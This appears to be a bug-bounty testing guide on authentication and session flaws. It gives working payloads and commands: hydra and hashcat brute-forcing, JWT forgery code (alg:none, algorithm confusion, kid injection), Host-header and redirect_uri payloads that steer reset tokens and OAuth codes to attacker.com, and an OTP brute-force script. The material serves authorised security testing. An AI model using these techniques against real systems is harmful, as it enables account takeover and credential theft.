---
title: "Part 2: Authentication & Session Vulnerabilities"
nav_order: 3
layout: default
---

## PART 2: AUTHENTICATION & SESSION VULNERABILITIES
*Status: COMPLETE — Iteration 2 (Parts A + B)*

> **The mindset:** Authentication is the front door. Session management is
> the lock on every door inside. Bugs here have the highest direct impact —
> they lead to account takeover, privilege escalation, and full application
> compromise. Always test auth flows manually. Scanners miss most of these.

---

### 2.1 Authentication Bypass

#### 2.1.1 Login Logic Flaws

🔍 **What to do:**
Before touching SQL injection or any technical attack, test the logic of the
login flow itself. Applications often implement auth checks incorrectly at the
code level — trusting client input, checking the wrong field, or short-circuiting
the auth decision based on a response value.

**Tests to run on every login endpoint:**

```
1. Submit empty credentials → what happens? Error or session?
2. Submit valid username + empty password → does it log in?
3. Submit username with leading/trailing whitespace → does it match?
4. Submit username as array: username[]=admin&password=x (PHP type juggling)
5. Submit JSON instead of form data (if app accepts both):
   {"username":"admin","password":{"$gt":""}}  → NoSQL injection
6. Change POST to GET — does login still work?
7. Submit credentials with Content-Type: text/plain — does it still process?
```

**Case sensitivity bypass:**
Many apps store usernames in lowercase but compare case-insensitively.
Try: `Admin`, `ADMIN`, `admin ` (trailing space), `admin\n` (newline).

🛠️ **Burp workflow:**
```
1. Intercept login request
2. Send to Repeater
3. Systematically test each variation above
4. Watch for: different response size, different redirect, session cookie issued
```

⚠️ **Gotchas:**
- A 200 response to a login request does not mean failure. Many apps return 200
  with `{"success": false}` in the body. Always check the full response body,
  not just the status code.
- Account lockout: if the program has aggressive lockout, note the threshold first
  and stay well below it. Locking out real users is out-of-scope behavior.

📚 **References:**
- [PortSwigger — Authentication vulnerabilities](https://portswigger.net/web-security/authentication)

---

#### 2.1.2 Default Credentials

🔍 **What to do:**
Admin panels, internal tooling, and third-party components shipped with default
credentials are one of the fastest paths to critical findings. This is especially
common on staging environments and internal tools discovered via recon.

**High-value targets for default credential testing:**

| Service | Default Credentials to Try |
|---------|---------------------------|
| Jenkins | `admin:admin`, `admin:password`, blank password |
| Grafana | `admin:admin` |
| Kibana | No auth by default (pre-7.x) |
| phpMyAdmin | `root:` (empty), `root:root` |
| Tomcat Manager | `admin:admin`, `tomcat:tomcat`, `admin:tomcat` |
| Router/network admin | `admin:admin`, `admin:password` |
| Spring Boot Actuator | No auth — just access `/actuator/env` |
| Jupyter Notebook | No auth by default |
| MongoDB | No auth by default (older installs) |
| Redis | No auth by default |
| Elasticsearch | No auth by default (pre-8.x) |

```bash
# Quick default credential test with hydra (only if program allows it):
hydra -l admin -P /opt/SecLists/Passwords/Default-Credentials/default-passwords.txt \
  https-form-post://target.com/login \
  "username=^USER^&password=^PASS^:Invalid credentials" \
  -t 4 -w 3

# For services with HTTP basic auth:
hydra -l admin \
  -P /opt/SecLists/Passwords/Default-Credentials/default-passwords.txt \
  target.com http-get /admin
```

⚠️ **Gotchas:**
- Brute-force is explicitly out of scope on most programs. Default credential testing
  is different — you're testing a small, known list, not mass brute-forcing.
  If in doubt, test manually with 5–10 combinations, not automated sweeps.
- Accessing an admin panel via default credentials is a Critical finding.
  Screenshot the panel, do not make changes, report immediately.

---

#### 2.1.3 Response Manipulation

🔍 **What to do:**
Some applications make the auth decision client-side, or trust a server response
value to determine whether login succeeded. Intercept and modify the response
before the browser processes it.

**The attack:**
```
Normal flow:
→ POST /login {username, password}
← 200 {"success": false, "redirect": null}
→ Browser stays on login page

Manipulated:
→ POST /login {username, password}
← 200 {"success": false, ...}
[Burp intercepts response, change "false" → "true"]
← 200 {"success": true, "redirect": "/dashboard"}
→ Does the browser now grant access?
```

**How to do it in Burp:**
```
1. Proxy → Options → Match and Replace
2. Add rule: Response body, "success\":false" → "success\":true"
3. Or: Intercept responses (Proxy → Intercept → "Intercept responses to...")
4. Manually edit the response before forwarding
```

**Other response values to manipulate:**
```json
{"authenticated": false}  →  {"authenticated": true}
{"role": "user"}          →  {"role": "admin"}
{"mfa_required": true}    →  {"mfa_required": false}
{"account_locked": true}  →  {"account_locked": false}
{"verified": false}       →  {"verified": true}
```

⚠️ **Gotchas:**
- If the server re-validates on subsequent requests (e.g. checks session server-side),
  response manipulation won't give persistent access. But it still demonstrates the flaw
  and is worth reporting — impact depends on what the manipulated response unlocks.
- This technique is most effective on SPAs (React, Angular, Vue) where the frontend
  drives navigation based on the API response.

---

### 2.2 Password Reset Flaws

**Context:** Password reset is one of the most consistently vulnerable features
in web applications. It involves generating a secret (token/link), transmitting it
(email/SMS), and validating it on use. Each step can fail.

---

#### 2.2.1 Token Predictability and Entropy Analysis

🔍 **What to do:**
If the reset token is predictable or has low entropy, an attacker can generate
valid tokens without receiving the email. Request multiple reset tokens and
analyze them for patterns.

```bash
# Request 5–10 reset tokens for your own test account
# Collect the tokens from the reset emails
# Analyze for patterns:

# Are they sequential?
# Token 1: reset_1001
# Token 2: reset_1002  → sequential, trivially predictable

# Are they time-based?
# Token 1: 1714000000abc  → contains Unix timestamp
# Decode: echo "1714000000" | date -d @1714000000

# Are they MD5/SHA1 of predictable input?
echo -n "admin@target.com" | md5sum
echo -n "admin@target.com$(date +%Y%m%d)" | md5sum

# Entropy check — is the token short?
# Tokens under 16 random chars are potentially brute-forceable
# 6-digit numeric OTP = 1,000,000 combinations = brute-forceable if no rate limit
```

**What good vs. bad tokens look like:**
```
Bad (predictable):
- reset_1001, reset_1002                    # sequential
- 5f4dcc3b5aa765d61d8327deb882cf99          # MD5 of "password"
- 20260429-admin@target.com                 # date + email
- 6-digit numeric OTP with no rate limit    # brute-forceable

Good (secure):
- 64+ character random alphanumeric string  # cryptographically random
- Signed JWT with short expiry              # if implemented correctly
```

📚 **References:**
- [PortSwigger — Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms)

---

#### 2.2.2 Host Header Injection for Reset Link Hijacking

🔍 **What to do:**
Many applications generate the password reset link by reading the `Host` header
from the incoming request. If the app doesn't validate this, an attacker can
inject a malicious host, causing the reset link to point to their server.
The victim clicks the link in their email → attacker receives the token.

**The attack:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

If vulnerable, the victim receives:
```
Reset your password: https://attacker.com/reset?token=abc123
```

**Variations to test:**
```http
# Standard Host header swap:
Host: attacker.com

# X-Forwarded-Host (often trusted by reverse proxies):
Host: target.com
X-Forwarded-Host: attacker.com

# X-Host:
X-Host: attacker.com

# Forwarded header:
Forwarded: host=attacker.com

# Port-based (if app includes port in URL):
Host: target.com:@attacker.com

# Subdomain confusion:
Host: attacker.com.target.com
```

🛠️ **Burp workflow:**
```
1. Go to forgot password page
2. Intercept the POST request
3. Modify Host header to your Burp Collaborator URL
4. Forward request
5. Check Collaborator for incoming HTTP request containing the reset token
```

✅ **PoC:**
- Collaborator interaction showing the reset token received at your server
- Screenshot of the email received by the victim account showing your domain in the link

⚠️ **Gotchas:**
- Many modern apps validate the Host header against an allowlist. Test all variations above —
  `X-Forwarded-Host` bypasses the Host validation more often than direct Host replacement.
- If the app sends a link to a different subdomain (e.g. `mail.target.com`), the reset
  URL may be hardcoded, not constructed from Host — this attack won't apply.
- You need a Burp Collaborator URL or `interactsh` server to receive the callback.
  Free alternative: `interactsh-client` — `interactsh-client -server interactsh.com`

📚 **References:**
- [PortSwigger — Host header attacks](https://portswigger.net/web-security/host-header)
- [interactsh](https://github.com/projectdiscovery/interactsh)

---

#### 2.2.3 Token Reuse and Expiry Bypass

🔍 **Tests to run:**
```
1. Token reuse after use:
   - Request reset, use the token, then try using the same token again
   - Expected: token invalidated. If it works again → report it.

2. Token doesn't expire:
   - Request a reset token, wait 24 hours, then try to use it
   - Expected: expired. If it still works → report it.

3. Old token not invalidated when new one is requested:
   - Request reset token (Token A)
   - Request another reset token (Token B)
   - Try using Token A → should be invalidated. If it works → report it.

4. Token not tied to account:
   - Request reset for account A (get token)
   - Try using token with account B's email in the submission form
   - Expected: validation fails. If it allows password change → ATO.

5. Token in URL leaks via Referer:
   - After clicking reset link, navigate to an external link
   - Check if the Referer header contains the token
   - This requires the reset URL to contain the token as a query param
```

---

#### 2.2.4 Username Enumeration

🔍 **What to do:**
Applications often reveal whether an account exists through different responses
to the "forgot password" form. This enables targeted attacks and is a valid
finding on its own (severity depends on context).

**What to compare:**
```
Registered email:
→ POST /forgot-password {email: registered@target.com}
← "We've sent a password reset link to your email"

Unregistered email:
→ POST /forgot-password {email: notreal@fake.com}
← "That email address is not registered"
← OR: different response time (timing oracle)
← OR: different response body length
← OR: different HTTP status code
```

```bash
# Automated enumeration check with ffuf:
ffuf -u https://target.com/forgot-password \
  -X POST \
  -d "email=FUZZ@target.com" \
  -w /opt/SecLists/Usernames/top-usernames-shortlist.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mr "sent" \   # match responses containing "sent" (successful enum)
  -o enum_results.txt

# Timing oracle — measure response time difference:
for email in admin@target.com fake12345@notreal.com; do
  time curl -s -X POST https://target.com/forgot-password \
    -d "email=$email" > /dev/null
done
# Significant time difference = timing oracle
```

⚠️ **Gotchas:**
- Username enumeration alone is usually P4/Informational on most programs.
  The exception: healthcare, finance, or any app where knowing a user exists
  has real-world sensitivity (e.g. a mental health platform).
- Always check login page AND registration page AND forgot password page —
  they often have different behaviors.

---

### 2.3 JWT Attacks

**Context:** JSON Web Tokens are used as session tokens, API auth tokens, and
inter-service credentials. A broken JWT implementation can mean full authentication
bypass or privilege escalation without needing a password.
JWT bugs are common because the spec has several dangerous optional features
that developers implement incorrectly.

**Anatomy of a JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header (base64)
.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0  ← Payload (base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature

# Decode header:
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Decode payload:
echo "eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0" | base64 -d
# {"user_id":123,"role":"user"}
```

---

#### 2.3.1 Algorithm Confusion (RS256 → HS256)

🔍 **What it is:**
When a server uses RS256 (asymmetric — signs with private key, verifies with public key),
an attacker can switch the algorithm to HS256 (symmetric — same key for signing and
verifying). If the server then uses its public key as the HMAC secret,
the attacker can forge tokens signed with the public key (which is, by definition, public).

**The attack:**
```python
import jwt, base64

# 1. Get the server's public key (from /.well-known/jwks.json, /api/keys, etc.)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkJh...
-----END PUBLIC KEY-----"""

# 2. Forge a token with HS256, signed with the public key as secret
forged_payload = {"user_id": 1, "role": "admin"}
forged_token = jwt.encode(
    forged_payload,
    public_key,
    algorithm="HS256"
)
print(forged_token)
```

🛠️ **With jwt_tool:**
```bash
# Detect algorithm and test confusion:
python3 jwt_tool.py <token> -X a -pk public_key.pem

# Full scan of all JWT attacks:
python3 jwt_tool.py <token> -M at \
  -pk public_key.pem \
  -t "https://target.com/api/protected" \
  -rh "Authorization: Bearer JWT_HERE"
```

📚 **References:**
- [PortSwigger — JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)

---

#### 2.3.2 `alg: none` Bypass

🔍 **What it is:**
The JWT spec allows `"alg": "none"` which means no signature is required.
A vulnerable server that accepts this will validate any unsigned token.

**The attack:**
```bash
# Take your current token, decode it, modify payload, set alg to none:
# Original header: {"alg":"HS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}

# Base64url encode the new header:
echo -n '{"alg":"none","typ":"JWT"}' | \
  base64 | tr '+/' '-_' | tr -d '='
# = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Base64url encode modified payload:
echo -n '{"user_id":1,"role":"admin"}' | \
  base64 | tr '+/' '-_' | tr -d '='

# Construct token with empty signature:
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.
```

🛠️ **With jwt_tool:**
```bash
python3 jwt_tool.py <token> -X n
# Automatically generates and tests alg:none variant
```

---

#### 2.3.3 Weak Secret Brute-Force

🔍 **What it is:**
HS256/HS384/HS512 tokens are signed with a secret key. If the key is weak
(short, common word, or left as default like `secret`, `password`, `key`),
it can be cracked offline and used to forge arbitrary tokens.

🛠️ **Commands:**
```bash
# hashcat — fastest, GPU-accelerated
hashcat -a 0 -m 16500 \
  <jwt_token> \
  /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

# john — CPU-based alternative
john --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt \
  --format=HMAC-SHA256 jwt.txt  # file containing the raw JWT

# jwt_tool brute-force:
python3 jwt_tool.py <token> -C \
  -d /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Common weak JWT secrets to try manually first:**
```
secret, password, key, jwt, token, admin, test, 123456,
your-256-bit-secret, your-secret-key, changeme, default
```

✅ **PoC:**
Once cracked, forge a token with elevated privileges:
```python
import jwt
secret = "cracked_secret"
forged = jwt.encode({"user_id": 1, "role": "admin"}, secret, algorithm="HS256")
# Use this token in Authorization header and demonstrate access
```

---

#### 2.3.4 `kid` Header Injection

🔍 **What it is:**
The `kid` (key ID) header tells the server which key to use for verification.
If the server uses `kid` in a SQL query or file path without sanitization,
this becomes a SQLi or path traversal vulnerability that lets you control
which key is used — potentially using a key you control to forge tokens.

**SQL injection via `kid`:**
```json
Header: {"alg":"HS256","kid":"' UNION SELECT 'attacker_secret' -- -"}
```
If vulnerable, the server uses `attacker_secret` as the signing key.
Sign a token with `attacker_secret` → forge arbitrary claims.

**Path traversal via `kid`:**
```json
Header: {"alg":"HS256","kid":"../../dev/null"}
```
Server reads `/dev/null` (empty file) as the key → sign token with empty string.

🛠️ **With jwt_tool:**
```bash
# SQLi via kid:
python3 jwt_tool.py <token> -I -hc kid \
  -hv "' UNION SELECT 'pwned' -- -" \
  -S hs256 -p "pwned"

# Path traversal via kid:
python3 jwt_tool.py <token> -I -hc kid \
  -hv "../../dev/null" \
  -S hs256 -p ""
```

📚 **References:**
- [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Burp JWT Editor extension](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)

---

#### 2.3.5 JWT Claim Manipulation

🔍 **What to do:**
Even without breaking the signature, test whether the server validates all claims:

```bash
# Using jwt_tool to tamper with claims:
# Tamper user role:
python3 jwt_tool.py <token> -I -pc role -pv admin

# Tamper user ID:
python3 jwt_tool.py <token> -I -pc user_id -pv 1

# Test expiry bypass — set exp to far future:
python3 jwt_tool.py <token> -I -pc exp -pv 9999999999

# Full tamper + verify against live endpoint:
python3 jwt_tool.py <token> -I -pc role -pv admin \
  -t "https://target.com/api/admin" \
  -rh "Authorization: Bearer JWT_HERE" \
  -S hs256 -p "known_secret"
```

**Claims worth tampering:**
```
role, user_role, is_admin, admin     → privilege escalation
user_id, sub, uid                    → IDOR / ATO
email                                → account switch
exp                                  → expiry bypass
scope                                → permission expansion
org_id, tenant_id                    → tenant isolation bypass
```

⚠️ **Gotchas:**
- jwt_tool's `-I` flag tampers but doesn't resign — test this first to see if
  the server validates the signature at all. Many don't.
- Some apps use JWTs as opaque tokens and validate server-side — tampering won't
  work regardless of signature. But it's still worth testing.
- The `nbf` (not before) claim can sometimes be set in the future to test if
  the server enforces it.

---

#### 2.3.6 JWT Testing Checklist

```
□ Decode and read all claims — what's in the payload?
□ Is alg:none accepted?
□ Is RS256→HS256 confusion possible? (get public key first)
□ Is the secret weak? (run hashcat on rockyou)
□ Does kid header accept SQL injection?
□ Does kid header accept path traversal?
□ Are claims validated server-side? (tamper role/id without valid sig)
□ Does exp get enforced? (use expired token)
□ Does the token work across different hosts/subdomains?
□ Is the token in a URL anywhere? (log/referer leakage risk)
```

📚 **References:**
- [PortSwigger JWT labs (all 8)](https://portswigger.net/web-security/jwt)
- [jwt_tool wiki](https://github.com/ticarpi/jwt_tool/wiki)
- [OWASP JWT cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

### 2.4 OAuth 2.0 Flaws

**Context:** OAuth is the auth delegation standard powering "Login with Google/GitHub/Facebook."
Its complexity — multiple flows, multiple actors, multiple redirect hops — creates
a wide attack surface. OAuth bugs regularly lead to full account takeover with no
user interaction required beyond clicking a malicious link.

**Quick OAuth flow recap:**
```
1. User clicks "Login with Google"
2. App redirects to Google: GET /auth?client_id=X&redirect_uri=https://target.com/callback&state=Y
3. User approves → Google redirects to: https://target.com/callback?code=AUTH_CODE&state=Y
4. App exchanges code for access token: POST /token {code, client_id, client_secret}
5. App uses access token to fetch user info → logs user in
```
Every step is an attack surface.

---

#### 2.4.1 Redirect URI Bypass

🔍 **What it is:**
The `redirect_uri` tells the OAuth provider where to send the authorization code.
If the provider validates it loosely, an attacker can redirect the code to their
own server — stealing it and completing the OAuth flow as the victim.

**Bypass techniques to test:**
```
Registered URI: https://target.com/callback

# Path traversal:
https://target.com/callback/../../../attacker.com

# Open redirect chain (see 5.2):
https://target.com/redirect?url=https://attacker.com

# Subdomain confusion:
https://attacker.com.target.com/callback
https://target.com.attacker.com/callback

# Parameter pollution:
redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com

# Weak prefix/suffix matching:
https://target.com.evil.com/callback
https://target.com/callbackX

# Encoded characters:
https://target.com%2Fattacker.com/callback
https://target.com%40attacker.com/callback
```

🛠️ **Burp workflow:**
```
1. Click "Login with OAuth provider"
2. Intercept the redirect to the provider's /auth endpoint
3. Modify redirect_uri using above variations
4. If provider accepts modified URI → craft malicious link
5. Victim clicks → code lands on your server → exchange for access token
```

✅ **PoC:**
```
1. Set up Burp Collaborator or interactsh to receive callbacks
2. Craft: https://provider.com/auth?client_id=X&redirect_uri=https://your.server/&response_type=code
3. Show code arriving at your server
4. Exchange code: POST /token {code, client_id, client_secret, redirect_uri}
5. Use returned token to access victim account → screenshot of ATO
```

📚 **References:**
- [PortSwigger — OAuth redirect_uri bypass](https://portswigger.net/web-security/oauth)

---

#### 2.4.2 State Parameter Bypass → CSRF

🔍 **What it is:**
The `state` parameter is OAuth's CSRF token. If absent or not validated,
an attacker can force-complete an OAuth flow in a victim's session,
linking the attacker's OAuth identity to the victim's account.

**Tests:**
```
1. Remove state= entirely from the auth URL → does provider accept it?
2. Intercept callback, change state value → does app verify it matches?
3. Reuse a state value from a previous flow → does it work again?
```

**The CSRF ATO attack:**
```
1. Attacker starts OAuth login → gets authorization URL with code
2. Stops before completing the callback step
3. Sends victim: target.com/callback?code=ATTACKER_CODE&state=anything
4. Victim (logged in) visits URL → app links attacker's OAuth to victim's account
5. Attacker logs in via OAuth → has victim's account
```

---

#### 2.4.3 Authorization Code Interception

🔍 **Leakage vectors:**
```
# Referrer leakage — callback page loads third-party resources:
# Open DevTools → Network → check Referer headers on any third-party requests
# If Referer contains ?code= → code is leaking to third parties

# Open redirect on callback page chains with code:
# target.com/callback?code=X has a redirect to an external URL
# Code appears in Referer of that external redirect

# Code reuse — is the code single-use?
# Capture a valid code, use it, then try using it again
# If second use succeeds → codes are not invalidated on use
```

---

#### 2.4.4 Account Takeover via OAuth Mislink

🔍 **What it is:**
When an app creates/links accounts based on email from the OAuth provider,
without verifying ownership of that email at registration, an attacker can
pre-register a victim's email to hijack their future OAuth login.

**The attack:**
```
1. Register on target.com with victim@gmail.com (no email verification required)
2. Victim later clicks "Login with Google" using victim@gmail.com
3. App sees email match → links or merges accounts
4. Attacker controls the account

Test both directions:
- Register first, then OAuth login with same email
- OAuth login first, then register with same email
- Link social account to existing account (check if ownership verified)
```

⚠️ **This is one of the most commonly overlooked high-impact OAuth bugs.
Always test on any app with both password login and social login.**

📚 **References:**
- [PortSwigger — OAuth account hijacking via mislink](https://portswigger.net/web-security/oauth)
- [All 6 PortSwigger OAuth labs](https://portswigger.net/web-security/oauth)

---

#### 2.4.5 OAuth Testing Checklist
```
□ redirect_uri strict validation? Test all bypass patterns from 2.4.1
□ state present and validated on callback?
□ Can OAuth flow be CSRF'd (force victim to complete attacker's flow)?
□ Does auth code appear in Referer to third-party resources?
□ Is auth code single-use and short-lived?
□ Pre-register with victim email before OAuth (2.4.4)?
□ Does app verify email from OAuth provider, or trust it blindly?
□ Open redirect on callback page chainable with code theft?
□ client_secret visible in client-side JS? (should be server-side only)
```

---

### 2.5 Multi-Factor Authentication Bypass

---

#### 2.5.1 OTP Brute-Force (Rate Limit Absent)

🔍 **What it is:**
A 6-digit numeric OTP has 1,000,000 combinations. Without rate limiting or
lockout, it can be brute-forced. Test by attempting 10 consecutive wrong codes
— if no lockout occurs, brute-force is viable.

🛠️ **Burp Intruder:**
```
1. Log in with valid credentials → reach MFA prompt
2. Intercept OTP submission → Send to Intruder
3. Mark OTP field as payload position
4. Payload: Numbers 000000–999999
5. Watch for different response length/redirect on valid code
```

**Turbo Intruder (faster):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5)
    for otp in range(1000000):
        engine.queue(target.req, str(otp).zfill(6))

def handleResponse(req, interesting):
    if "dashboard" in req.response or "Welcome" in req.response:
        table.add(req)
```

---

#### 2.5.2 Response Manipulation

🔍 **Test:**
```
1. Submit wrong OTP code
2. Intercept server response: {"mfa_valid": false}
3. Modify to: {"mfa_valid": true}
4. Forward — does app grant access?

Also test request-side:
- Add header: X-MFA-Bypass: true
- Add parameter: &skip_mfa=true
- Modify request body: {"otp": "000000", "skip": true}
```

---

#### 2.5.3 MFA Skip via Direct Navigation

🔍 **Test:**
```
1. Log in with valid credentials (password auth complete)
2. When redirected to MFA page, do NOT submit a code
3. Directly navigate to: /dashboard, /account/settings, /api/v1/user
4. If protected pages load → MFA enforced client-side only → bypass

API layer check:
After password auth, before MFA — grab the session cookie and test API endpoints:
curl -H "Cookie: session=<partial_auth>" https://target.com/api/v1/user/profile
If it returns data → API layer doesn't enforce MFA
```

---

#### 2.5.4 Backup Code and Recovery Abuse

🔍 **Tests:**
```
□ Backup code rate limiting: try 10 wrong backup codes → lockout?
□ Backup code reuse: use a valid code, try again → should fail
□ Recovery flow bypasses MFA: does "forgot authenticator" skip MFA entirely?
□ Password reset → login without MFA?
  (if password reset logs you in directly → MFA bypassed for any resettable account)
```

---

### 2.6 Session Management

---

#### 2.6.1 Session Fixation

🔍 **Test:**
```bash
# Note session token before login:
curl -sc pre_login_cookies.txt https://target.com/ > /dev/null
PRE=$(grep -i session pre_login_cookies.txt | awk '{print $NF}')

# Log in:
curl -sc post_login_cookies.txt \
  -d "username=test&password=test" \
  https://target.com/login > /dev/null
POST=$(grep -i session post_login_cookies.txt | awk '{print $NF}')

# Compare:
[ "$PRE" = "$POST" ] && echo "VULNERABLE: session token unchanged after login"
```

---

#### 2.6.2 Session Not Invalidated on Logout

🔍 **Test:**
```
1. Log in → copy session cookie value
2. Log out normally
3. Replay saved cookie:
   curl -H "Cookie: session=<saved>" https://target.com/api/user
4. If returns authenticated data → server-side session not invalidated

Extended tests:
- Change password → old session still valid?
- Change email → old session still valid?
- Deactivate account → active sessions still work?
```

---

#### 2.6.3 Cookie Security Flags

🔍 **Check:**
```bash
curl -sv https://target.com/ 2>&1 | grep -i "set-cookie"
# Expected: Set-Cookie: session=X; Secure; HttpOnly; SameSite=Strict
```

| Flag | Absent Risk | Exploitability |
|------|------------|----------------|
| `Secure` | Sent over HTTP | Network position required |
| `HttpOnly` | `document.cookie` readable → XSS steals it | Requires XSS |
| `SameSite` | Sent cross-site → CSRF | Requires CSRF vector |

⚠️ **Standalone missing cookie flags are Low/Informational on most programs.
Report as part of an exploit chain, not standalone unless specifically rewarded.**

---

#### 2.6.4 Session Token Entropy (Burp Sequencer)

🔍 **Test:**
```
Proxy → Sequencer → Live capture → select session token response
Collect 200+ tokens → Run analysis
Result under 80 effective entropy bits → report as weak session entropy
```

```bash
# Quick manual check — are tokens obviously weak?
for i in {1..10}; do
  curl -sc /tmp/c$i.txt -d "u=test&p=test" https://target.com/login > /dev/null
  grep -i session /tmp/c$i.txt | awk '{print $NF}'
done
# Look for: sequential values, timestamps, short length (<32 chars), predictable patterns
```

---

### 2.7 Single Sign-On (SSO) / SAML Flaws

---

#### 2.7.1 SAML XML Signature Wrapping (XSW)

🔍 **What it is:**
XML signature validation and XML parsing can operate on different elements.
XSW inserts a forged assertion alongside the legitimately signed one —
the signature validates (it's real) but the app processes the forged element.

🛠️ **SAML Raider (Burp extension):**
```
1. Install SAML Raider via BApp Store
2. Log in via SSO → intercept the SAML Response POST
3. Send request to SAML Raider tab
4. Use "XSW Attacks" → automatically generates all 8 XSW variants
5. Test each variant → watch for successful authentication as different user
```

**Manual — decode, modify, re-encode:**
```bash
# Decode SAML response from POST body (it's base64):
echo "<b64_value>" | base64 -d > saml.xml

# Edit saml.xml: change NameID to target user, add wrapping structure
# Re-encode:
base64 -w0 saml.xml
# Replace in request and forward
```

📚 **References:**
- [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)
- [OWASP SAML cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)

---

#### 2.7.2 SAML Signature Removal and Replay

🔍 **Tests:**
```
1. Remove <Signature> block entirely from SAML response
   → Re-encode and forward → does app accept unsigned assertion?

2. Replay a captured SAML response in a new session
   → Different browser/IP → does app accept it?
   (proper impl: checks InResponseTo ID + NotOnOrAfter timestamp)

3. Modify NameID (username) without valid signature
   → Change to admin@target.com → does app accept it?
```

---

#### 2.7.3 Audience and Timestamp Bypass

🔍 **Tests:**
```
1. Audience bypass:
   - Complete SSO on app-a.target.com → capture SAML response
   - Submit same response to app-b.target.com's ACS endpoint
   - Does app-b accept a response intended for app-a?

2. Timestamp bypass:
   - Does app enforce NotBefore / NotOnOrAfter?
   - Use an expired SAML response → still accepted?
   - Set system clock back → replay very old response

3. InResponseTo bypass:
   - Does app validate that InResponseTo matches a real SP-initiated request ID?
   - Submit IdP-initiated assertion → does app accept unsolicited assertions?
```

---

### Part 2 — Complete Testing Checklist

```
AUTH BYPASS
□ Empty credentials, array input, Content-Type variation, method swap
□ Default credentials on admin panels found via recon
□ Response manipulation: false → true on auth decision

PASSWORD RESET
□ Token entropy: collect 5+ tokens, check for patterns
□ Host header injection: Host, X-Forwarded-Host, X-Host, Forwarded
□ Token reuse after use
□ Token still valid after 24hrs
□ Old token valid after new one requested
□ Token bound to wrong account (account A token used for account B)
□ Username enumeration via response or timing

JWT
□ Decode and read all claims — what's in the payload?
□ alg:none accepted?
□ RS256→HS256 confusion (get public key from JWKS endpoint)
□ Weak secret — hashcat + rockyou
□ kid SQLi and path traversal
□ Claim tampering without valid signature

OAUTH
□ redirect_uri: all 8 bypass patterns
□ state present, validated, not reusable
□ Auth code in Referer to third parties
□ Auth code single-use
□ Pre-register with victim email before OAuth
□ Account linking logic tested both directions

MFA
□ OTP rate limiting (10 attempts → lockout?)
□ Response manipulation on MFA step
□ Direct navigation past MFA after password auth
□ API endpoints accessible with partial-auth session
□ Backup code reuse and rate limiting
□ Recovery/reset flow that skips MFA

SESSION
□ Token unchanged after login (fixation)
□ Session valid after logout
□ Session valid after password/email change
□ Cookie flags: Secure, HttpOnly, SameSite
□ Token entropy via Burp Sequencer

SSO/SAML
□ All 8 XSW variants via SAML Raider
□ Signature removed entirely → still accepted?
□ Response replayed in new session
□ NameID modified without signature
□ Audience bypass across services
□ NotBefore/NotOnOrAfter timestamp enforcement
```

📚 **Part 2 Master References:**
- [PortSwigger Authentication labs](https://portswigger.net/web-security/authentication)
- [PortSwigger OAuth labs](https://portswigger.net/web-security/oauth)
- [PortSwigger JWT labs](https://portswigger.net/web-security/jwt)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)
- [PayloadsAllTheThings — Authentication bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Authentication%20Bypass)

---

